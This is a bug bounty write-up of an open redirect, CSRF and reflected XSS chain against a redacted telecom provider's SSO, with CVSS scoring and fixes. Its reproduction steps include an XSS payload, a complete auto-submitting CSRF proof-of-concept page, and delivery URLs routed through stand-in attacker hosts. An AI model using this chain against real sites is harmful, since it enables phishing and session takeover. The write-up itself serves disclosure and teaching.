# CVE-Class: Chained Open Redirect → CSRF → Reflected XSS (3-Stage Chain)

**Program:** Private Bug Bounty Program (Telecom Provider)  
**Vulnerability Class:** Reflected XSS via CSRF, delivered via Open Redirect  
**Endpoint Types:** SSO Logout Handler · Federated Login Page  
**OWASP 2021:** A3 – Injection · A5 – Security Misconfiguration  
**CVSS v3.1 Score:** 8.8 (High)  
**Status:** Accepted — Acknowledged by Security Team  
**Discovery Date:** Q1 2024

---

## TL;DR

I identified a 3-stage vulnerability chain in a major telecom provider's SSO infrastructure. An unvalidated redirect parameter on the logout endpoint served as a trusted delivery vehicle for a CSRF exploit page, which in turn triggered a Reflected XSS on the federated login endpoint — all from a single link sent to a victim, originating from the company's own domain.

---

## Vulnerability Details

| Field | Value |
|---|---|
| Stage 1 | Open Redirect — SSO logout endpoint (`GET`) |
| Stage 2 | CSRF — Federated login page (`POST`) |
| Stage 3 | Reflected XSS — Login endpoint parameter |
| Authentication Required | None (attacker-side) |
| User Interaction | One click |
| Entry Domain | Legitimate company SSO domain |

### Root Causes

**Stage 1 — Open Redirect:**  
The SSO logout endpoint accepted a `redirect_destination` parameter and followed it after session termination with no domain validation. An attacker could supply any URL as the post-logout destination.

**Stage 2 — Missing CSRF Protection:**  
The federated login endpoint accepted cross-origin POST requests with no token validation. Any page could silently submit a POST on a visitor's behalf.

**Stage 3 — Reflected XSS:**  
A `resource_url` parameter in the POST body was reflected unsanitized in the server's response, allowing injected script to execute in the victim's browser.

---

## CVSS v3.1 Breakdown

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector (AV) | Network | Fully remote |
| Attack Complexity (AC) | Low | No special conditions required |
| Privileges Required (PR) | None | No attacker account needed |
| User Interaction (UI) | Required | Victim clicks one link |
| Scope (S) | Unchanged | Impact contained to target application |
| Confidentiality (C) | High | Session tokens and user data at risk |
| Integrity (I) | High | Arbitrary actions possible in user context |
| Availability (A) | High | Session destruction / persistent access possible |
| **Base Score** | **8.8 — High** | |

---

## Attack Chain

```
[Attacker]
    │
    │  1. Hosts CSRF PoC page at attacker.com/poc.html
    │     (auto-POSTs to target login with XSS payload)
    │
    ▼
[Crafts delivery URL using Open Redirect]
    │
    │  https://sso.[REDACTED].com/logout?
    │       destination=https://attacker.com/poc.html
    │
    ▼
[Victim clicks link — URL looks legitimate (company SSO domain)]
    │
    │  2. SSO logout fires, redirects to attacker.com/poc.html
    │
    ▼
[Victim's browser lands on CSRF PoC page]
    │
    │  3. Page auto-POSTs to login.[REDACTED].com
    │     with XSS payload in resource_url parameter
    │
    ▼
[Target login server reflects payload unsanitized]
    │
    │  4. Script executes under login.[REDACTED].com origin
    │
    ▼
[Attacker controls victim's session on target domain]
```

---

## What Makes This Chain Dangerous

Without the open redirect, the attacker would need to convince the victim to visit `attacker.com` directly — a suspicious, unrecognized domain. The open redirect on the **company's own SSO domain** converts `attacker.com/poc.html` into a link that starts with `sso.[company].com`, passing basic link-inspection scrutiny and corporate email link-scanning tools.

The three individual issues in order of typical severity:
- Open Redirect alone: Medium (6.3)
- CSRF on login alone: Low–Medium
- Reflected XSS via direct Self-XSS: typically rejected by most programs

**Chained: 8.8 High.** This is the core insight — bug chains require understanding each vulnerability not just in isolation, but as a potential link in a delivery mechanism.

---

## Reproduction Steps

> `[SSO-DOMAIN]` and `[LOGIN-DOMAIN]` represent redacted company subdomains.

**Step 1.** Confirm the open redirect. Navigate to:
```
https://[SSO-DOMAIN]/logout?destination=https://example.com
```
Verify you are redirected to `example.com` after logout completes.

**Step 2.** Confirm the XSS reflection. Submit a POST to `[LOGIN-DOMAIN]` with:
```
resource_url="><script>alert(1)</script>
```
Verify the script tag appears unencoded in the response body.

**Step 3.** Generate a CSRF PoC that auto-submits the malicious POST on page load:

```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
  <form action="https://[LOGIN-DOMAIN]/" method="POST" id="f">
    <input type="hidden" name="resource_url"
           value='"><script>alert(document.domain)</script>'>
    <!-- additional hidden fields matching the original request -->
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

**Step 4.** Host `poc.html` on any publicly accessible server.

**Step 5.** Construct the final delivery URL using the open redirect:
```
https://[SSO-DOMAIN]/logout?destination=https://attacker-server.com/poc.html
```

**Step 6.** Send this URL to a victim. One click executes the full chain: logout → redirect → CSRF POST → XSS execution.

---

## Fix Recommendations

### Stage 1 — Open Redirect
- Validate the `destination` parameter against a strict server-side allowlist of approved post-logout URLs.
- Prefer redirect tokens over raw URLs (map an opaque ID to a permitted destination server-side).
- Reject or strip any destination value pointing to an external domain.

### Stage 2 — CSRF
- Implement per-session CSRF tokens validated server-side on every non-idempotent request.
- Set `SameSite=Strict` on session cookies to prevent cross-origin POST submissions.

### Stage 3 — Reflected XSS
- HTML-encode all user-supplied values before inserting them into response HTML.
- Implement a Content Security Policy header as defense-in-depth.

> Fixing any one of the three issues breaks the chain. Fixing all three is required to be secure against each attack individually.
